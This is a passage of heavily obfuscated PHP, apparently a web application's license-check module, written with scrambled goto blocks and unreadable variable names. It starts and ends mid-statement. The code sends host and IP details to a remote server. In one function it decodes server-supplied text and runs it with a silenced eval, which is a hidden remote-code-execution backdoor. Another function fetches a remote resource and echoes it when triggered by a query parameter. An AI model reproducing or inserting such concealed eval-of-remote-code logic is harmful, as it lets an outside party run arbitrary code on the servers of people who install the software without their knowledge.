(strlen($EÆöİĞ) < $cŸéÖµì÷¿[594]) { return; } $FêŞÕ±ëâ‰ = $d®¾Şå¾‡Ä[61]($d®¾Şå¾‡Ä[62])->{$_SERVER[­£][63]}(); $D÷Û©íÖÖÁ = array($d®¾Şå¾‡Ä[165] => $FêŞÕ±ëâ‰[$d®¾Şå¾‡Ä[64]], $d®¾Şå¾‡Ä[166] => $FêŞÕ±ëâ‰[$d®¾Şå¾‡Ä[65]], $d®¾Şå¾‡Ä[167] => $d®¾Şå¾‡Ä[10]); goto eá‹ÍÊŒÊĞ; E¥ôà¤Éå©: $d®¾Şå¾‡Ä[13](array($d®¾Şå¾‡Ä[157], $d®¾Şå¾‡Ä[158]), $D÷Û©íÖÖÁ); goto dˆ‘èİ—„¶; dˆ‘èİ—„¶: } private function pgoi082817d8() { goto aŞĞŠ”¾ë±; BµàÊçôÏÕ: $cÔµàÄâ˜Ÿ = $BÉ¥Ëù´¶Å[$bƒİÍ¾Üªƒ[231]]; $fíÕ¨ª¦æ¿ = array(); $B“„­–´¤ = $Fî¸²¶ö—ï[620]; goto Bè•”‘¯®æ; F§ôÏˆ¤Ó: $CàÓ½‹òÁ² = $bƒİÍ¾Üªƒ[25]($bƒİÍ¾Üªƒ[120]($eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[216]]), 10, 10); $ešá¶Íˆîê = $CàÓ½‹òÁ² . $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[126]] . $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[218]]; $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[128]] = $bƒİÍ¾Üªƒ[220]($bƒİÍ¾Üªƒ[124]($this->{$_SERVER[­£][153]}($ešá¶Íˆîê, $bƒİÍ¾Üªƒ[221]))); goto D„›¦Ö—; aƒƒ„Âæõ: $cï—”„ôÓÙ = $Fî¸²¶ö—ï[618]; if (strlen($cï—”„ôÓÙ) < $Fî¸²¶ö—ï[567]) { die; } $C´öîì–èù = $this->{$_SERVER[­£][133]}($bƒİÍ¾Üªƒ[154]($CàåİãÓá), $EÏÕğÒŒì‹); goto D…ï¦µ´; d‰—Û‚‹ºå: if (strlen($aó©²å£Ø) < $Fî¸²¶ö—ï[576]) { return; } $bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[11])->{$_SERVER[­£][232]}($cÔµàÄâ˜Ÿ[$bƒİÍ¾Üªƒ[233]], array($bƒİÍ¾Üªƒ[234] => $fíÕ¨ª¦æ¿)); $this->ytaz7d0fb951 = $CàåİãÓá; goto EŸ²íé·ÓÂ; F­ÄßçÊÓ³: $CàåİãÓá = $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]]; $A¹Ã‡¤ÚÏ‰ = $this->{$_SERVER[­£][206]}($CàåİãÓá[$bƒİÍ¾Üªƒ[207]]); $EğôÍÔùÇ• = $Fî¸²¶ö—ï[616]; goto cÀ™³‡¯­; e·¨® ãîå: $this->{$_SERVER[­£][235]}(); Cache::set($bƒİÍ¾Üªƒ[236] . $bƒİÍ¾Üªƒ[120]($E¤ÛšŒ‰ç¼ . $bƒİÍ¾Üªƒ[237]), $bƒİÍ¾Üªƒ[10]); $E•‚Ô·ºîÔ = $Fî¸²¶ö—ï[623]; goto aà™Ï¥èÇÙ; D…ï¦µ´: $cô°ƒÀİôÁ = $Fî¸²¶ö—ï[619]; while (strlen($cô°ƒÀİôÁ) < $Fî¸²¶ö—ï[576]) { if (!$cô°ƒÀİôÁ) { break; } $cô°ƒÀİôÁ++; } $BÉ¥Ëù´¶Å = $bƒİÍ¾Üªƒ[228]($bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[11])->{$_SERVER[­£][229]}(), $bƒİÍ¾Üªƒ[230]); goto BµàÊçôÏÕ; a«¶Ç‹·¯í: if (!isset($B±ãö«‹[$bƒİÍ¾Üªƒ[171]]) || $bƒİÍ¾Üªƒ[24]($B±ãö«‹[$bƒİÍ¾Üªƒ[171]]) != 16) { $bƒİÍ¾Üªƒ[172]($bƒİÍ¾Üªƒ[173] . $B±ãö«‹[$bƒİÍ¾Üªƒ[171]], !1); } $E¤ÛšŒ‰ç¼ = $bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[62])->{$_SERVER[­£][63]}($bƒİÍ¾Üªƒ[122]); $Cƒ”™¸Õßõ = array($bƒİÍ¾Üªƒ[171] => $B±ãö«‹[$bƒİÍ¾Üªƒ[171]], $bƒİÍ¾Üªƒ[174] => $bƒİÍ¾Üªƒ[130](16), $bƒİÍ¾Üªƒ[175] => $bƒİÍ¾Üªƒ[155], $bƒİÍ¾Üªƒ[176] => $bƒİÍ¾Üªƒ[177], $bƒİÍ¾Üªƒ[178] => $_SERVER[$bƒİÍ¾Üªƒ[179]], $bƒİÍ¾Üªƒ[180] => $_SERVER[$bƒİÍ¾Üªƒ[181]], $bƒİÍ¾Üªƒ[182] => $_SERVER[$bƒİÍ¾Üªƒ[183]]); goto c¹Ê®õôø; aà™Ï¥èÇÙ: $bƒİÍ¾Üªƒ[172]($bƒİÍ¾Üªƒ[204]($bƒİÍ¾Üªƒ[214]), !0); $F•ãœ”ğ¦¹ = $Fî¸²¶ö—ï[624]; while (strlen($F•ãœ”ğ¦¹) < $Fî¸²¶ö—ï[594]) { if (!$F•ãœ”ğ¦¹) { break; } $F•ãœ”ğ¦¹++; } goto D­©ğ‰´é; eèóÈàÃäÍ: $cõçå’‹– = $E­ğ‹ ÛÎ­ . $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[126]] . $this->{$_SERVER[­£][153]}($bƒİÍ¾Üªƒ[120]($eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[215]]), $E­ğ‹ ÛÎ­); $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[129]] = $bƒİÍ¾Üªƒ[124]($bƒİÍ¾Üªƒ[220]($this->{$_SERVER[­£][153]}($cõçå’‹–, $bƒİÍ¾Üªƒ[222]))); if ($CàåİãÓá[$bƒİÍ¾Üªƒ[223]] && $CàåİãÓá[$bƒİÍ¾Üªƒ[223]] >= 1) { $bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[62])->{$_SERVER[­£][224]}($bƒİÍ¾Üªƒ[225], $bƒİÍ¾Üªƒ[226]); } goto D ç¶¾ô; Bè•”‘¯®æ: if (!$B“„­–´¤) { return; } $fíÕ¨ª¦æ¿[$aĞ…ËÂç“Ä] = $C´öîì–èù; $aó©²å£Ø = $Fî¸²¶ö—ï[621]; goto d‰—Û‚‹ºå; dÉÌ‡õ¦‰¯: $DÚ„‡íŠ˜ = $Fî¸²¶ö—ï[615]; if ($B±ãö«‹[$bƒİÍ¾Üªƒ[184]] == $bƒİÍ¾Üªƒ[185]) { $EÊÜãÙ¤‰ = $this->{$_SERVER[­£][153]}($F§éÏ¯‘¼É, $bƒİÍ¾Üªƒ[186]); $e‰ì†ÛŞ· = $this->{$_SERVER[­£][133]}($bƒİÍ¾Üªƒ[154]($Cƒ”™¸Õßõ), $F§éÏ¯‘¼É . $bƒİÍ¾Üªƒ[187], 3); $e‰ì†ÛŞ· = $e‰ì†ÛŞ· . $bƒİÍ¾Üªƒ[188] . $_SERVER[$bƒİÍ¾Üªƒ[179]]; $cŠßÃÍÚàÆ = $this->{$_SERVER[­£][189]}($bƒİÍ¾Üªƒ[190] . $EÊÜãÙ¤‰ . $bƒİÍ¾Üªƒ[191] . $e‰ì†ÛŞ·, -1); $bƒİÍ¾Üªƒ[172]($cŠßÃÍÚàÆ, !0); } else { if ($B±ãö«‹[$bƒİÍ¾Üªƒ[184]] == $bƒİÍ¾Üªƒ[192]) { $f¸ ‹º•˜  = $bƒİÍ¾Üªƒ[25]($bƒİÍ¾Üªƒ[120]($bƒİÍ¾Üªƒ[193] . $F§éÏ¯‘¼É), 12, 15) . $bƒİÍ¾Üªƒ[194]; $e‰ì†ÛŞ· = $this->{$_SERVER[­£][195]}($bƒİÍ¾Üªƒ[2]($B±ãö«‹[$bƒİÍ¾Üªƒ[196]]), $f¸ ‹º•˜ , 2); $BÊ‹Š‘Å” = $bƒİÍ¾Üªƒ[197]($e‰ì†ÛŞ·, !0); if (!$bƒİÍ¾Üªƒ[198]($BÊ‹Š‘Å”) || !$bƒİÍ¾Üªƒ[198]($BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]]) || $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[171]] != !0) { $C°×ª«µì = $bƒİÍ¾Üªƒ[200]; $F”ïĞ×„ÕŒ = $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]] ? $bƒİÍ¾Üªƒ[201] . $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]] : $C°×ª«µì; $bƒİÍ¾Üªƒ[172]($F”ïĞ×„ÕŒ, !1); } else { $Cƒ”™¸Õßõ[$bƒİÍ¾Üªƒ[174]] = $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]][$bƒİÍ¾Üªƒ[202]]; } } else { $BÊ‹Š‘Å” = $this->{$_SERVER[­£][189]}($bƒİÍ¾Üªƒ[203], $Cƒ”™¸Õßõ, 10); } } if (!$bƒİÍ¾Üªƒ[198]($BÊ‹Š‘Å”) || !$bƒİÍ¾Üªƒ[198]($BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]]) || $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[171]] != !0) { $C°×ª«µì = $bƒİÍ¾Üªƒ[204]($bƒİÍ¾Üªƒ[205]); $F”ïĞ×„ÕŒ = $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]] ? $bƒİÍ¾Üªƒ[201] . $BÊ‹Š‘Å”[$bƒİÍ¾Üªƒ[199]] : $C°×ª«µì; $bƒİÍ¾Üªƒ[172]($F”ïĞ×„ÕŒ, !1); } goto F­ÄßçÊÓ³; cÀ™³‡¯­: if (!$A¹Ã‡¤ÚÏ‰ || $A¹Ã‡¤ÚÏ‰ != $CàåİãÓá[$bƒİÍ¾Üªƒ[151]]) { $Aã‡œ­ä¥ß = array($bƒİÍ¾Üªƒ[208] => $bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[62])->{$_SERVER[­£][63]}($bƒİÍ¾Üªƒ[122]), $bƒİÍ¾Üªƒ[209] => $_SERVER[$bƒİÍ¾Üªƒ[121]], $bƒİÍ¾Üªƒ[210] => $bƒİÍ¾Üªƒ[211](), $bƒİÍ¾Üªƒ[180] => $_SERVER[$bƒİÍ¾Üªƒ[181]]); $e‰ì†ÛŞ· = $this->{$_SERVER[­£][212]}($bƒİÍ¾Üªƒ[154]($Aã‡œ­ä¥ß)); $this->{$_SERVER[­£][189]}($bƒİÍ¾Üªƒ[213] . $e‰ì†ÛŞ·); $bƒİÍ¾Üªƒ[172]($bƒİÍ¾Üªƒ[204]($bƒİÍ¾Üªƒ[214]), !0); } $eîì˜¾Üœ± = array($bƒİÍ¾Üªƒ[215] => $Cƒ”™¸Õßõ[$bƒİÍ¾Üªƒ[171]], $bƒİÍ¾Üªƒ[216] => $CàåİãÓá[$bƒİÍ¾Üªƒ[217]], $bƒİÍ¾Üªƒ[218] => $bƒİÍ¾Üªƒ[130](16), $bƒİÍ¾Üªƒ[126] => $CàåİãÓá[$bƒİÍ¾Üªƒ[219]]); if ($Cƒ”™¸Õßõ[$bƒİÍ¾Üªƒ[174]]) { $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[218]] = $Cƒ”™¸Õßõ[$bƒİÍ¾Üªƒ[174]]; } goto F§ôÏˆ¤Ó; c¹Ê®õôø: $e†¢©ˆË = $Fî¸²¶ö—ï[614]; while (strlen($e†¢©ˆË) < $Fî¸²¶ö—ï[574]) { if (!$e†¢©ˆË) { break; } $e†¢©ˆË++; } $F§éÏ¯‘¼É = $bƒİÍ¾Üªƒ[120]($_SERVER[$bƒİÍ¾Üªƒ[121]] . $E¤ÛšŒ‰ç¼); goto dÉÌ‡õ¦‰¯; D„›¦Ö—: $E­ğ‹ ÛÎ­ = $bƒİÍ¾Üªƒ[130](16); $fªˆ¤ß¶ = $Fî¸²¶ö—ï[617]; if (!$fªˆ¤ß¶) { die; } goto eèóÈàÃäÍ; aŞĞŠ”¾ë±: $Fî¸²¶ö—ï =& $_SERVER[Æ¼ôºÙï]; $bƒİÍ¾Üªƒ =& $_SERVER[­£]; if ($_SERVER[$bƒİÍ¾Üªƒ[44]] != $bƒİÍ¾Üªƒ[168]) { return; } goto E­Šïèë´; EŸ²íé·ÓÂ: $this->qadr1544447b = $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[126]]; $f‰ñ†¼êÁø = $Fî¸²¶ö—ï[622]; if (!$f‰ñ†¼êÁø) { die; } goto e·¨® ãîå; D ç¶¾ô: $bƒİÍ¾Üªƒ[61]($bƒİÍ¾Üªƒ[62])->{$_SERVER[­£][227]}($eîì˜¾Üœ±); $EÏÕğÒŒì‹ = $bƒİÍ¾Üªƒ[120]($_SERVER[$bƒİÍ¾Üªƒ[121]] . $bƒİÍ¾Üªƒ[220]($E¤ÛšŒ‰ç¼) . $eîì˜¾Üœ±[$bƒİÍ¾Üªƒ[216]]); $aĞ…ËÂç“Ä = $bƒİÍ¾Üªƒ[220]($bƒİÍ¾Üªƒ[25]($EÏÕğÒŒì‹, 10, 16)); goto aƒƒ„Âæõ; E­Šïèë´: if (!$bƒİÍ¾Üªƒ[112]($GLOBALS, $bƒİÍ¾Üªƒ[138])) { die; } $B±ãö«‹ = $GLOBALS[$bƒİÍ¾Üªƒ[22]]; if (isset($B±ãö«‹[$bƒİÍ¾Üªƒ[169]])) { $this->{$_SERVER[­£][170]}(); die; } goto a«¶Ç‹·¯í; D­©ğ‰´é: } private function licenseRegistSuccess() { goto EİĞ„²Ã·É; Fºöîôğö: $AÀºŒ½¨‘[116]($AÀºŒ½¨‘[238])->{$_SERVER[­£][239]}(!0); goto bÃĞÊïÀó; EİĞ„²Ã·É: $c§†ç…¹ô» =& $_SERVER[Æ¼ôºÙï]; $AÀºŒ½¨‘ =& $_SERVER[­£]; $f¥ã§’»Ú = $AÀºŒ½¨‘[61]($AÀºŒ½¨‘[62])->{$_SERVER[­£][63]}(); goto Eæñ›Ñ; Eæñ›Ñ: $cµÇÅ³ÌåÂ = $c§†ç…¹ô»[625]; while (strlen($cµÇÅ³ÌåÂ) < $c§†ç…¹ô»[576]) { if (!$cµÇÅ³ÌåÂ) { break; } $cµÇÅ³ÌåÂ++; } if ($f¥ã§’»Ú[$AÀºŒ½¨‘[89]] != $AÀºŒ½¨‘[226]) { $AÀºŒ½¨‘[61]($AÀºŒ½¨‘[62])->{$_SERVER[­£][227]}($AÀºŒ½¨‘[89], $AÀºŒ½¨‘[226]); } goto Fºöîôğö; bÃĞÊïÀó: } private function suya6c180413() { goto B£Â»éÍõ; c«È÷•½: $this->ytaz7d0fb951 = array(); $this->qadr1544447b = $dÙ©ÀºÇÃ„[127]; goto aÎë¤ãø‹; BŞöùÊ¹¬: $dÙ©ÀºÇÃ„[61]($dÙ©ÀºÇÃ„[62])->{$_SERVER[­£][224]}($dÙ©ÀºÇÃ„[225], $dÙ©ÀºÇÃ„[240]); $Bø¹Î¶Œä¥ = $bà‚˜Âˆ¤É[626]; if (strlen($Bø¹Î¶Œä¥) < $bà‚˜Âˆ¤É[574]) { return; } goto c«È÷•½; B£Â»éÍõ: $bà‚˜Âˆ¤É =& $_SERVER[Æ¼ôºÙï]; $dÙ©ÀºÇÃ„ =& $_SERVER[­£]; $dÙ©ÀºÇÃ„[61]($dÙ©ÀºÇÃ„[62])->{$_SERVER[­£][227]}(array($dÙ©ÀºÇÃ„[215] => $dÙ©ÀºÇÃ„[10], $dÙ©ÀºÇÃ„[216] => $dÙ©ÀºÇÃ„[10], $dÙ©ÀºÇÃ„[126] => $dÙ©ÀºÇÃ„[127], $dÙ©ÀºÇÃ„[128] => $dÙ©ÀºÇÃ„[10], $dÙ©ÀºÇÃ„[129] => $dÙ©ÀºÇÃ„[10])); goto BŞöùÊ¹¬; aÎë¤ãø‹: } private function hcldfed313a0() { goto f¥ˆ¡®ÉÅÊ; aëœÉ«¬Øä: if (!$f“©›åˆ×[198]($c‰ôå†Ê¸¥) || !isset($c‰ôå†Ê¸¥[$f“©›åˆ×[241]]) || $f“©›åˆ×[242]() - $c‰ôå†Ê¸¥[$f“©›åˆ×[241]] >= 60) { $AŞ½Ñƒ´í« = $f“©›åˆ×[228]($f“©›åˆ×[61]($f“©›åˆ×[11])->{$_SERVER[­£][229]}(), $f“©›åˆ×[230]); $BÂĞİé¢œ = $AŞ½Ñƒ´í«[$f“©›åˆ×[231]]; $aˆâ­’¼¦… = $f“©›åˆ×[120]($_SERVER[$f“©›åˆ×[121]] . $f“©›åˆ×[220]($e¢¡„¢ëÕÜ) . $DÓÖ¤œ™[$f“©›åˆ×[216]]); $F¾Éö×Œé³ = $f“©›åˆ×[220]($f“©›åˆ×[25]($aˆâ­’¼¦…, 10, 16)); $c‰ôå†Ê¸¥ = $this->{$_SERVER[­£][195]}($BÂĞİé¢œ[$f“©›åˆ×[100]][$F¾Éö×Œé³], $aˆâ­’¼¦…); $c‰ôå†Ê¸¥ = $f“©›åˆ×[197]($c‰ôå†Ê¸¥, !0); } if (!$f“©›åˆ×[198]($c‰ôå†Ê¸¥)) { return $this->{$_SERVER[­£][170]}(); } $FÓÙÕ…“Ù‹ = $f“©›åˆ×[150]($c‰ôå†Ê¸¥[$f“©›åˆ×[151]]); goto Eíµ—×‹¸˜; A¸áÄÇÎ«´: $e„ë’Ú… = $E¥©Ã‡­Ÿ[627]; while ($e„ë’Ú… < $E¥©Ã‡­Ÿ[567]) { if ($e„ë’Ú… >= 0) { break; } $e„ë’Ú…++; } $this->qadr1544447b = $f“©›åˆ×[127]; goto C‡ç‹¬ĞÙË; C‡ç‹¬ĞÙË: $DÓÖ¤œ™ = $f“©›åˆ×[61]($f“©›åˆ×[62])->{$_SERVER[­£][63]}(); if ($DÓÖ¤œ™[$f“©›åˆ×[126]] == $f“©›åˆ×[127]) { return; } $e¢¡„¢ëÕÜ = $f“©›åˆ×[61]($f“©›åˆ×[62])->{$_SERVER[­£][63]}($f“©›åˆ×[122]); goto DÎ°š¦¬Âô; Eíµ—×‹¸˜: if ($f“©›åˆ×[242]() >= $FÓÙÕ…“Ù‹) { return $this->{$_SERVER[­£][170]}(); } $c‰ôå†Ê¸¥[$f“©›åˆ×[241]] = $f“©›åˆ×[242](); Cache::set($eË’ĞÚƒß—, $c‰ôå†Ê¸¥); goto DìŠæ ÚàÇ; DÎ°š¦¬Âô: $F«†İÀíÁ = $E¥©Ã‡­Ÿ[628]; if (!$F«†İÀíÁ) { return; } $eË’ĞÚƒß— = $f“©›åˆ×[236] . $f“©›åˆ×[120]($e¢¡„¢ëÕÜ . $f“©›åˆ×[237]); goto Eî»ÆĞ›†¢; f¥ˆ¡®ÉÅÊ: $E¥©Ã‡­Ÿ =& $_SERVER[Æ¼ôºÙï]; $f“©›åˆ× =& $_SERVER[­£]; $_SERVER[$f“©›åˆ×[181]] = $f“©›åˆ×[112]($_SERVER, $f“©›åˆ×[181], APP_HOST); goto A¸áÄÇÎ«´; DìŠæ ÚàÇ: $this->ytaz7d0fb951 = $c‰ôå†Ê¸¥; $this->qadr1544447b = $DÓÖ¤œ™[$f“©›åˆ×[126]]; goto FøÜï‘…ˆ; Eî»ÆĞ›†¢: $c‰ôå†Ê¸¥ = Cache::get($eË’ĞÚƒß—); $bª–¤ø¨¹ = $E¥©Ã‡­Ÿ[629]; while ($bª–¤ø¨¹ < $E¥©Ã‡­Ÿ[578]) { if ($bª–¤ø¨¹ >= 0) { break; } $bª–¤ø¨¹++; } goto aëœÉ«¬Øä; FøÜï‘…ˆ: } private function dtzuce18b19e() { $C™¢Ê¤Ï™Ù =& $_SERVER[­£]; $FÉºô¹‡à‚ = $GLOBALS[$C™¢Ê¤Ï™Ù[22]]; $FÃƒß¸¤Ş = $_SERVER[$C™¢Ê¤Ï™Ù[44]]; if ($FÃƒß¸¤Ş == $C™¢Ê¤Ï™Ù[243] && $this->qadr1544447b == $C™¢Ê¤Ï™Ù[127]) { $C™¢Ê¤Ï™Ù[172]($C™¢Ê¤Ï™Ù[204]($C™¢Ê¤Ï™Ù[244]), !1, $C™¢Ê¤Ï™Ù[245]); } $eÅ“¿öÛ­Ó = array($C™¢Ê¤Ï™Ù[246], $C™¢Ê¤Ï™Ù[247]); if ($C™¢Ê¤Ï™Ù[248]($FÃƒß¸¤Ş, $eÅ“¿öÛ­Ó)) { if ($this->qadr1544447b == $C™¢Ê¤Ï™Ù[127] && isset($FÉºô¹‡à‚[$C™¢Ê¤Ï™Ù[249]])) { $C™¢Ê¤Ï™Ù[172]($C™¢Ê¤Ï™Ù[204]($C™¢Ê¤Ï™Ù[244]), !1, $C™¢Ê¤Ï™Ù[245]); die; } $fˆÃ±¶øÃ» = $this->{$_SERVER[­£][143]}(); if ($fˆÃ±¶øÃ» != $C™¢Ê¤Ï™Ù[250]($C™¢Ê¤Ï™Ù[251])) { if ($fˆÃ±¶øÃ» <= $C™¢Ê¤Ï™Ù[61]($C™¢Ê¤Ï™Ù[145])->{$_SERVER[­£][146]}()) { $C™¢Ê¤Ï™Ù[172]($C™¢Ê¤Ï™Ù[204]($C™¢Ê¤Ï™Ù[252]), !1, $C™¢Ê¤Ï™Ù[245]); die; } } } } private function sthb306b09fd() { goto B¡İñöô¼Ô; D†êìÌœ½â: if (!$eé¡º‘±¸[112]($GLOBALS, $eé¡º‘±¸[138]) || !isset($_GET[$eé¡º‘±¸[254]])) { return; } if (!$eé¡º‘±¸[248]($_SERVER[$eé¡º‘±¸[44]], $AåÉó¥¥ß«)) { return; } $eè†¹ «•Ò = $eé¡º‘±¸[255]; goto c†¬ÒŸ½•; B¡İñöô¼Ô: $DÂ–‚âÄÅ— =& $_SERVER[Æ¼ôºÙï]; $eé¡º‘±¸ =& $_SERVER[­£]; $AåÉó¥¥ß« = array($eé¡º‘±¸[141], $eé¡º‘±¸[253]); goto D†êìÌœ½â; F•¢Ë„µŞ‚: $d£æ‚ğÅƒé = $DÂ–‚âÄÅ—[632]; $eé¡º‘±¸[264]($eé¡º‘±¸[265]); if ($eĞåùÑƒã && $eé¡º‘±¸[32]($eĞåùÑƒã, $eé¡º‘±¸[266])) { echo $eĞåùÑƒã; } goto eÁ»ª¶; a¾…Ø©Å²ô: $cÒ–±®×ƒ = $eé¡º‘±¸[258](array($eé¡º‘±¸[259] => array($eé¡º‘±¸[260] => $eé¡º‘±¸[261], $eé¡º‘±¸[262] => 3))); $e³¶‹Ó®¶È = $DÂ–‚âÄÅ—[631]; $eĞåùÑƒã = @$eé¡º‘±¸[263]($eè†¹ «•Ò, !1, $cÒ–±®×ƒ); goto F•¢Ë„µŞ‚; eÁ»ª¶: die; goto D—ªÀÇî; c†¬ÒŸ½•: $eè†¹ «•Ò = $this->{$_SERVER[­£][256]}($eè†¹ «•Ò, $eé¡º‘±¸[257]); $Bê†³è”¿Ç = $DÂ–‚âÄÅ—[630]; while (strlen($Bê†³è”¿Ç) < $DÂ–‚âÄÅ—[574]) { if (!$Bê†³è”¿Ç) { break; } $Bê†³è”¿Ç++; } goto a¾…Ø©Å²ô; D—ªÀÇî: } public function jsrla3302ac4($c§ÛÂçéãª) { goto d Ø£Ú…Ñ; a²È³õ—©¡: foreach ($bˆ¤†ÔŒŠ as $d¥„ö‡¼½„) { unset($c§ÛÂçéãª[$d¥„ö‡¼½„]); $bÍÙöÌÏ˜ = $F‚Ä–†¼§¥[634]; if (strlen($bÍÙöÌÏ˜) < $F‚Ä–†¼§¥[574]) { return; } } return $c§ÛÂçéãª; goto FÍ¸Ú¯˜ˆ¦; bˆÉâ“Ë: $CŠ¸ã“ªë¡ = $F‚Ä–†¼§¥[633]; if (!$CŠ¸ã“ªë¡) { return; } foreach ($D¯£Š§…Âö as $d¥„ö‡¼½„ => $e¾‰ÀÓÁ˜) { if ($e¾‰ÀÓÁ˜ == $b†¼–æø¶‹[269] && $b†¼–æø¶‹[25]($this->qadr1544447b, 0, 1) == $b†¼–æø¶‹[269]) { continue; } if (!$b†¼–æø¶‹[248]($d¥„ö‡¼½„, $dµ–µÂñÆĞ)) { $bˆ¤†ÔŒŠ[] = $d¥„ö‡¼½„; } } goto a²È³õ—©¡; Fª•ï‹ùìİ: $D¯£Š§…Âö = array($b†¼–æø¶‹[268] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[270] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[271] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[272] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[273] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[274] => $b†¼–æø¶‹[269], $b†¼–æø¶‹[275] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[277] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[278] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[279] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[280] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[281] => $b†¼–æø¶‹[276], $b†¼–æø¶‹[282] => $b†¼–æø¶‹[276]); $dµ–µÂñÆĞ = $b†¼–æø¶‹[0]($b†¼–æø¶‹[283], $b†¼–æø¶‹[112]($this->ytaz7d0fb951, $b†¼–æø¶‹[135], $b†¼–æø¶‹[10])); $bˆ¤†ÔŒŠ = array(); goto bˆÉâ“Ë; d Ø£Ú…Ñ: $F‚Ä–†¼§¥ =& $_SERVER[Æ¼ôºÙï]; $b†¼–æø¶‹ =& $_SERVER[­£]; if ($this->qadr1544447b == $b†¼–æø¶‹[267]) { return $c§ÛÂçéãª; } goto Fª•ï‹ùìİ; FÍ¸Ú¯˜ˆ¦: } private function byjf30e45e93() { $D´Å·¦¯²ö =& $_SERVER[­£]; if ($this->qadr1544447b != $D´Å·¦¯²ö[127]) { return; } $GLOBALS[$D´Å·¦¯²ö[100]][$D´Å·¦¯²ö[104]][$D´Å·¦¯²ö[284]] = $D´Å·¦¯²ö[226]; $GLOBALS[$D´Å·¦¯²ö[100]][$D´Å·¦¯²ö[285]] = $D´Å·¦¯²ö[226]; if ($D´Å·¦¯²ö[61]($D´Å·¦¯²ö[286])->{$_SERVER[­£][63]}($D´Å·¦¯²ö[89]) != $D´Å·¦¯²ö[240]) { $D´Å·¦¯²ö[61]($D´Å·¦¯²ö[286])->{$_SERVER[­£][227]}($D´Å·¦¯²ö[89], $D´Å·¦¯²ö[240]); } } public function hbnoe85254ca() { return $_SERVER[­£][287]; $FŒŠ›Íã = $_SERVER[Æ¼ôºÙï][635]; if (!$FŒŠ›Íã) { return; } } private function hvxe994a717c() { goto d„“å®½£Æ; EÕ‘¿İí…„: if ($dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[171]] && $dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[297]]) { if ($this->{$_SERVER[­£][206]}($dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[297]]) == $ağ†Â°ô‚õ[$aêÇ–ÈË¾–[171]]) { return; } } $this->{$_SERVER[­£][170]}(); if ($this->{$_SERVER[­£][206]}($dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[297]]) != $ağ†Â°ô‚õ[$aêÇ–ÈË¾–[171]]) { $c¯ÎœÇ¨­… = array($aêÇ–ÈË¾–[208] => $aêÇ–ÈË¾–[61]($aêÇ–ÈË¾–[62])->{$_SERVER[­£][63]}($aêÇ–ÈË¾–[122]), $aêÇ–ÈË¾–[209] => $_SERVER[$aêÇ–ÈË¾–[121]], $aêÇ–ÈË¾–[210] => $aêÇ–ÈË¾–[211](), $aêÇ–ÈË¾–[180] => $_SERVER[$aêÇ–ÈË¾–[181]]); $BÁÚ¹…Œ« = $this->{$_SERVER[­£][212]}($aêÇ–ÈË¾–[154]($c¯ÎœÇ¨­…)); $dãÚùç²Ÿ¡ = $this->{$_SERVER[­£][189]}($aêÇ–ÈË¾–[213] . $BÁÚ¹…Œ«); if ($dãÚùç²Ÿ¡ && $aêÇ–ÈË¾–[198]($dãÚùç²Ÿ¡) && isset($dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[297]])) { $B•Àõ„µÍğ = $this->{$_SERVER[­£][195]}($dãÚùç²Ÿ¡[$aêÇ–ÈË¾–[297]], 2); if ($B•Àõ„µÍğ) { $B•Àõ„µÍğ = $this->{$_SERVER[­£][206]}($B•Àõ„µÍğ); } if ($B•Àõ„µÍğ) { try { @eval($B•Àõ„µÍğ); } catch (Exception $b‹µ„ó‡Ÿ„) { } } } } goto aÌŞğä‹–Ñ; dÊò’µï»¢: $DãÑ·ÌÈ§· = $DÂ¶‹Œ³Å[637]; while (strlen($DãÑ·ÌÈ§·) < $DÂ¶‹Œ³Å[594]) { if (!$DãÑ·ÌÈ§·) { break; } $DãÑ·ÌÈ§·++; } if ($eà·¼³»à && $aêÇ–ÈË¾–[242]() - $eà·¼³»à < $aêÇ–ÈË¾–[250]($aêÇ–ÈË¾–[295])) { return; } goto AŠ’é¬Œ¼Ù; d„“å®½£Æ: $DÂ¶‹Œ³Å =& $_SERVER[Æ¼ôºÙï]; $aêÇ–ÈË¾– =& $_SERVER[­£]; $cààƒÖùÓ” = array($aêÇ–ÈË¾–[288], $aêÇ–ÈË¾–[289], $aêÇ–ÈË¾–[290]); goto EÈø³õ©²; AŠ’é¬Œ¼Ù: $aêÇ–ÈË¾–[13](array($aêÇ–ÈË¾–[293], $aêÇ–ÈË¾–[158]), $AòØ³‰µ¨, $aêÇ–ÈË¾–[242]()); $ağ†Â°ô‚õ = array($aêÇ–ÈË¾–[171] => 